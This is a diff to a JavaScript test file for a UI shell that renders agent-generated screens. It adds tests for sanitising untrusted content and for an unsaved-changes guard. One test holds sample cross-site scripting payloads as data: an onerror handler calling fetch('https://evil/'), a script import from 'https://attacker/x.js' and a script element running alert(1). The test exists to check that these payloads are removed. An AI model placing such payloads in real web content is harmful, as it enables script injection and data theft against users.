@@ -6,6 +6,7 @@ vi.mock('@infra/http/AxiosMateuApiClient', () => ({ mateuApiClient: { runAction:
 
 import { contentViewFor, GENERATED_HOST_ID, GENERATED_SCREEN_ID, overlayOf, renderScreenInShell } from './builtInRenderTarget'
 import { UIFragmentAction } from '@mateu/shared/apiClients/dtos/UIFragmentAction'
+import { dirtyGuard } from './dirtyGuard'
 
 /**
  * The shell's own render target for a generated screen: it finds the content area the chat
@@ -78,7 +79,7 @@ describe('renderScreenInShell', () => {
         const [baseUrl, route, consumedRoute, actionId, initiatorId, , serverSideType, componentState, parameters] = runAction.mock.calls[0]
         expect({ baseUrl, route, consumedRoute, actionId, initiatorId, serverSideType, componentState, parameters })
             .toEqual({ baseUrl: '/app', route: '/bookings', consumedRoute: '', actionId: '__preview__', initiatorId: 'content',
-                serverSideType: undefined, componentState: {}, parameters: { _yaml: 'type: Text\ntext: hi' } })
+                serverSideType: undefined, componentState: {}, parameters: { _yaml: 'type: Text\ntext: hi', _untrusted: true } })
         expect(ux.shown).toEqual([fragment])
     })
 
@@ -134,6 +135,44 @@ describe('renderScreenInShell', () => {
         const lonely = document.createElement('div')
         document.body.innerHTML = ''
         await expect(renderScreenInShell(lonely, { yaml: 'type: Text', target: 'content' })).rejects.toThrow(/no content area/)
+    })
+
+    it('an agent-authored screen is UNTRUSTED: nothing in it can run script, whichever path renders it', async () => {
+        const { ux, page, chat } = shell()
+        page.remove()
+        const evil = { type: 'ClientSide', id: 'gen', children: [], metadata: { type: 'Element', name: 'img',
+            attributes: { src: 'x', onerror: "fetch('https://evil/')", import: 'https://attacker/x.js' }, on: {}, content: '<b>hi</b>', html: true } }
+        runAction.mockResolvedValue({ fragments: [{ ...fragment, component: evil }] })
+        await renderScreenInShell(chat, { yaml: 'type: Element', target: 'content' })
+        const served = (ux.shown[0] as { component: { metadata: Record<string, unknown> } }).component.metadata
+        expect(served).toMatchObject({ name: 'img', attributes: { src: 'x' }, html: false })
+        expect(JSON.stringify(served)).not.toMatch(/onerror|attacker/)
+        // the static-bundle / offline path expands JSON in the browser: the same rules apply
+        runAction.mockRejectedValue(new Error('down'))
+        await renderScreenInShell(chat, { yaml: JSON.stringify({ type: 'Element', name: 'script', content: 'alert(1)' }), target: 'content' })
+        expect(JSON.stringify(ux.shown[1])).not.toContain('alert(1)')
+        expect(JSON.stringify(ux.shown[1])).not.toContain('"script"')
+    })
+
+    it('into the CONTENT it asks before discarding unsaved changes; a drawer covers nothing it would lose', async () => {
+        const { ux, chat } = shell()
+        runAction.mockResolvedValue({ fragments: [fragment] })
+        dirtyGuard.markDirty()
+        const confirm = vi.spyOn(window, 'confirm').mockReturnValue(false)
+        try {
+            await renderScreenInShell(chat, { yaml: 'type: Text', target: 'content' })
+            expect(confirm).toHaveBeenCalledTimes(1)
+            expect(runAction).not.toHaveBeenCalled()
+            expect(ux.shown).toHaveLength(0)
+            await renderScreenInShell(chat, { yaml: 'type: Text', target: 'drawer' })
+            expect(confirm).toHaveBeenCalledTimes(1)
+            confirm.mockReturnValue(true)
+            await renderScreenInShell(chat, { yaml: 'type: Text', target: 'content' })
+            expect(ux.shown).toEqual([fragment])
+        } finally {
+            confirm.mockRestore()
+            dirtyGuard.markClean()
+        }
     })
 
     it('an overlay without a title is the generated screen', () => {
